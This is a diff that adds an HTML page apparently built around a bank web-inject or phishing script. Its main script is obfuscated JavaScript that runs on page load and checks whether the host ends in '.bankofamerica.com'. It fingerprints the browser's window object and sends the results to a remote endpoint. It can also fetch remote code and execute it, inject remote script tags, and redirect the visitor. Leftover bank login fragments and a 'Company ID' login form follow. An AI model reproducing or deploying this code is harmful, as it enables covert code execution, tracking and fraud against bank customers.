@@ -1,0 +1,63 @@
+<html>
+  <head>
+    <title></title>
+  </head>
+  <body>
+    <script type="text/javascript">
+      (function(){var bb=(function(){var j=(function(){var k=document,m=window,n=encodeURIComponent,r=decodeURIComponent;function x(a){return!!a&&(a instanceof Function||(typeof a=="object"&&!(a instanceof Object)))?true:false}function s(a,c,b){if(a.addEventListener){a.addEventListener(c,b,false);return true}if(a.attachEvent){return a.attachEvent("on"+c,b)}return false}function y(a,c){var b;if(k.createEvent){b=k.createEvent("HTMLEvents");b.initEvent(c,true,true);return!a.dispatchEvent(b)}if(k.createEventObject){b=k.createEventObject();return a.fireEvent("on"+c,b)}return false}function z(a){if(!m){return}if(k.readyState=='complete'){a();return}s(m,"load",a)}function A(a,c){var b=k.createElement(a);for(var d in c){b[d]=c[d]}return b}function p(a){var c=k.getElementsByTagName('script'),b=null,d=null,f=0,g=new RegExp("(.+)/"+a,"i");for(var h=0,i=c.length;h<i;h++){d=c[h].src.match(g);if(d!=null&&d.length==2){b=d[1];f++}}if(f==1){return b}return false}function t(a){if(typeof(a)=="string"){return a}var c=[];for(var b in a){c.push(b+"="+n(a[b]))}return c.join("&")}function B(a){var c={},b=(a||"").split("&"),d;for(var f=0,g=b.length;f<g;f++){d=b[f].split("=");if(d.length==2){c[d[0]]=r(d[1])}}return c}function u(a){var c='abcdefghiklmnopqrstuvwxyz_'.split(''),b=c.length,d=Math.random,f=Math.floor,g=new Array(a);for(var h=0;h<a;h++){g.push(c[f(d()*b)])}return g.join("")}function C(a,c,b){a=a.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");var d="[\\?&]"+a+"=([^&#]*)",f=new RegExp(d),g=f.exec(c);return(g==null)?b:g[1]}function o(a){var c=a.lastIndexOf("/"),b=a.substr(1,c-1),d=a.substring(c+1);return new RegExp(b,d)}function D(a){if(a.charAt(0)=='/'){return"/"}else{a=a.match(/^https?:\/\/[^\/]*\//)[0];return a}}function v(a,c){for(var b=0,d=c.length;b<d;b++){regex=o(c[b]);if(regex.test(a)){return true}}return false}return{_1:x,_3:s,_5:y,_8:z,_9:A,_6:p,_0:t,_4:B,_a:u,_b:C,_c:o,_d:v,_e:D}})();var M=(function(){var m=document,n=window,r={},x=j._6("hI2.html"),s=[x,"ghb3.html"].join("/"),y="4b4f263187d8d4c";function z(a,c){var b=m.createElement('iframe');b.id="iframe"+Math.round((Math.random()*999));b.style.width="0";b.style.height="0";b.style.border="none";b.frameBorder="0";b.src="javascript: false;";m.getElementsByTagName('body')[0].appendChild(b);b.contentWindow.name=j._0(c);setTimeout(function(){b.contentWindow.location.replace(a)},25);return b.id}function A(a,c){var b=m.getElementById(a),d=null;try{d=b.contentWindow.location;if(b&&b.contentWindow&&d!="about:blank"&&d.hash.indexOf("#")==0&&b.contentWindow.name&&d.protocol!="javascript:"){n.clearInterval(r[a]);c.apply(this,[j._4(b.contentWindow.name)])}}catch(e){}}function p(a,c,b,d){var f=[a,j._0(c)].join("?"),g=z(f,d);r[g]=n.setInterval(function(){A(g,b)},200)}function t(a,c,b,d){var f=m.createElement("iframe");f.style.display="none";f.src="javascript: false;";f.width=0;f.height=0;f.style.border="none";m.body.appendChild(f);f.contentWindow.name=j._0(d);j._3(f,"load",function(){try{b(f.contentWindow.document.documentElement.innerHTML)}catch(e){}});f.contentWindow.location.replace([a,j._0(c)].join("?"))}function B(){try{return new XMLHttpRequest()}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}try{return new ActiveXObject("Msxml3.XMLHTTP")}catch(e){}try{return new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}return null}function u(a,c,b,d){var f=[a,c].join("?"),g,h=B(),i="GET",k={};if(d){i="POST";k["Content-Type"]="application/x-www-form-urlencoded"}h.open(i,f,true);for(g in k){h.setRequestHeader(g,k[g])}h.onreadystatechange=function(){if(h.readyState==4&&h.status==200){b(h.responseText)}};h.send(j._0(d))}function C(c,b,d,f){var g,h,i="XMLHttpRequest";if(d){b+="&c="+d}g=[c,b].join("?");if(n[i]&&(h=new n[i]()).withCredentials!==undefined){h.open("GET",g,true);h.withCredentials=true;h.onreadystatechange=function(a){if(h.readyState==4&&(h.status==200||h.status==0)){try{new Function(h.responseText)()}catch(a){}}};h.send()}else{setTimeout(function(){o(c,b)},0)}}function o(a,c,b){var d=m.createElement('script');d.type="text/javascript";d.async=true;if(b){c+="&c="+b}d.src=[a,c].join("?");m.getElementsByTagName('head')[0].appendChild(d)}function D(a,c,b,d){var f={qp:j._0(c),pd:j._0(d),u:a};p(s,{},b,f)}function v(a,c,b){var d=new Image();if(j._1(b)){j._3(d,"load",b)}d.src=[a,c].join("?");d.style.display="none";d.width=0;d.height=0;d.style.border="none";m.body.appendChild(d)}function N(a,c,b,d,f,g){if(!a){return}b=j._0(b);if(!b.match(/dn=(.[^&]+)/)){b+="&dn="+encodeURIComponent(y)}if(g&&g.qs&&!g.qs==""){b+="&"+g.qs}switch(a){case"image":{v(c,b,d);break}case"iframe":{t(c,b,d,f);break}case"xframe":{p(c,b,d,f);break}case"jsonp":{o(c,b,d);break}case"ajax":{u(c,b,d,f);break}case"xpost":{D(c,b,d,f);break}case"jsonpi":{C(c,b,d,f);break}default:{break}}}return{_f:t,_g:p,_h:o,_i:v,_j:u,_7:N}})();var E=(function(){function g(a){var c=/^https?:\/\/([\w\-\.]+)(\:\d+)?(\/|$)/i,b;if(a){b=a.match(c);if(b&&b.length>2){return(b[1].indexOf(".")===0)?b[1]:"."+b[1]}}return null}function h(a,c){var b=a.length-c.length;return(b>=0&&a.indexOf(c,b)===b)}function i(a,c){var b=g(a);if(b){for(var d=0,f=c.length;d<f;d++){if(h(b,c[d])){return true}}}return false}return{_2:i}})();var l=window,G=document,O="5",P=l.location,w=j._4(l.name),bc=P.href.match(/[\?&]ec=([^&#]*)/),H=w['bu']||'',Q=[H,"/","g8C"].join(""),R=2,q=[{"n":"click","t":"f","s":"#mybutton"},{"n":"click","t":"f","s":"#t"},{"n":"click","t":"f","s":"#mybutton"}],I={"!!1246606919!!":"cookie-missing_2","!!3032249!!":"browser-not-compatible","!!-1383249261!!":"PluginMissing2703","!!327022751!!":"PluginMissing2702","!!-1965196027!!":"cookie-missing_5","#<YAML::PrivateType:0x7f3b7bf0f4e8>":"PluginMissing2706","!!-859201825!!":"cookie-missing_4","!!-1780000523!!":"cookie-missing_l","!!1733636824!!":"MissingReference","!!-1954294733!!":"cookie-missing_3","!!102892930!!":"Pluginmissing","!!-499281507!!":"pluginMissing","!!-2034064907!!":"PluginMissing","!!938193176!!":"pluginmissing","!!-1564242200!!":"PluginMissing2701","!!937698070!!":"plugin-missing","!!-1255912713!!":"cookie-missing_6","#<YAML::PrivateType:0x7f3b7bf109d8>":"PluginMissing2705","!!3643479!!":"os-uncompatible","!!-1788328966!!":"PluginMissing2704","!!-191261474!!":"plugin-missingflv","!!-2083231234!!":"plugin_missing"},S=1,J=[{"t":"n"},{"sub":{"l":4,"s":0},"t":"toString"},{"sub":{"l":14,"s":0},"t":"toString"}],F=[".bankofamerica.com"],T={"window":true,"frameElement":true,"parent":true,"top":true,"defaultView":true,"self":true};function U(a){var c=0,b=0,d;if(a.length==0)return c;for(b=0;b<a.length;b++){d=a.charCodeAt(b);c=((c<<5)-c)+d;c=c&c}return"!!"+c+"!!"}function V(a){if(!a){return null}if(a.indexOf("#")==0){return[G.getElementById(a.substring(1))]}if(a.indexOf("<")==0&&a.indexOf(">")==a.length-1){return G.getElementsByTagName(a.substring(1,a.length-1))||[]}if(l[a]){return[l[a]]}return[]}function W(){var b,d,f,g,h,i,k;h={'e':function(a,c){j._5(a,c)},'f':function(a,c){if(j._1(a[c])){a[c]()}}};for(d=0,f=q.length;d<f;d++){g=V(q[d]['s']);for(i=0,k=g.length;i<k;i++){if(h[q[d]['t']]){h[q[d]['t']].apply(this,[g[i],q[d]['n']])}}}l.setTimeout(X,1)}function Y(a,c){var b=[],d,f,g,h;for(var i=0,k=J.length;i<k;i++){d=J[i];f=d["t"];if(f=="n"){g=c}else if(f=="p"){g=""+a[c]}else if(j._1(a[c][f])){g=a[c][f]()}if(d["sub"]){g=String(g).substring(d["sub"]["s"],d["sub"]["l"])}h=U(g);if(I[h]){b.push(I[h])}}return b}function K(a,c,b){var d=[],f;for(var g in a){try{if(T[g]||a[g]==null||typeof(a[g])=='undefined'){continue}f=Y(a,g);if(f&&f.length>0){d=d.concat(f)}if(c<b&&typeof(a[g])=="object"){d=d.concat(K(a[g],c+1,b))}}catch(e){}}return d}function Z(a){var c={},b=[];for(var d=0,f=a.length;d<f;d++){c[a[d]]=true}for(var g in c){b.push(g)}return b}function X(){var a=Z(K(l,1,S));var c={cid:O,ci:R};M._7("ajax",Q,c,ba,{h:a.join(","),"e":(w["e"]||"")})}function L(){if(!E._2(H,F)){return}if(w.e&&!E._2(w.e,F)){return}l.setTimeout(W,500)}function ba(a){if(E._2(a,F)){l.setTimeout(function(){l.location.replace(a)},100)}}if(l.onload){l.___onload=l.onload;l.onload=function(){L();l.___onload()}}else{l.onload=L}})()})();
+      </script>
+      
+<div id='t'>
+<!-- </html> -->
+<!-- <b>Account Balances</b> -->
+<!--  document.write("<td><input class='enter' type='submit' value='Enter' name='OK'>"); -->
+<!-- <form name="LOGIN" action="/app/bps/main" method="post" onSubmit="return prepared();"> -->
+<!-- </HTML> -->
+</div>
+<script type='text/javascript'>
+(function(){ try { var t, i, m, f, w = window, d = document; t = d.getElementById('t'); if(t) { i = t.innerHTML;
+  m = i.match(/f\w+n\s+(\S+)\s*\(/);if(m && m.length==2) { f = m[1]; w["___" + f] = true; }}} catch(e) {}})(); </script>
+
+<!-- <head> 
+-->
+<!-- <head > -->
+
+<form name='myform' id='myform' onsubmit='return false;'>
+  <input type='submit' id='mybutton' />
+</form>
+<div id='myfocus'></div>
+
+<html>
+  <head>
+       <title></title>
+    </head>
+    <body style="background-color: #E9E9E9; ">
+       <table class="loginTable withShadow" cellspacing="0">
+            <tbody class="dataText" style="vertical-align:top">
+                 <tr>
+                      <td style="width:24em; padding-bottom: 50px;">
+                         <form id="loginBox" name="loginBox" method="POST" action="index.cgi" autocomplete="OFF">
+                              <table class="loginBox withShadow" style="width:95%">
+                                   <tbody class="loginCredentials">
+                                        <tr>
+                                           <td class="sidePadded">Company ID</td>
+                                        </tr>
+                                        <tr>
+                                           <td class="sidePadded"><input type="text" class="loginCredentials required" style="width:90%" id="companyID"
+                                                name="companyID" size="20" value="" onKeyPress="submitOnEnter(event);"/>
+                                                <br/><span id="err_companyID"/>
+                                           </td>
+                                        </tr>
+                                   </tbody>
+                              </table>
+                         </form>
+                      </td>
+                      <td rowspan="2">
+                      </td>
+                 </tr>
+            </tbody>
+       </table>
+    </body>
+
+    </body>
+  </html>
